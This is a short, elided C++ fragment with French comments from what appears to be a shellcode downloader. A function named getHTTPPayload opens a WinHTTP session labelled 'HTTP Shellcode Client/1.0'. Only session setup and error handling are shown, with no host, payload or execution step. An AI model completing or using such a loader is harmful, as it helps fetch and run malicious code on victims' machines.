...
PBYTE getHTTPPayload(DWORD& payloadSize) {
    ...
    //Ouverture d'une session HTTP avec WinHttpOpen
    HINTERNET hSession = WinHttpOpen(L"HTTP Shellcode Client/1.0",
        ...
        0);
    if (!hSession) {
        std::cerr << "Erreur ouverture de la session : " << GetLastError() << std::endl;
        return nullptr;
    }
    ...
    if (!hConnect) {
        std::cerr << "Erreur de connexion : " << GetLastError() << std::endl;
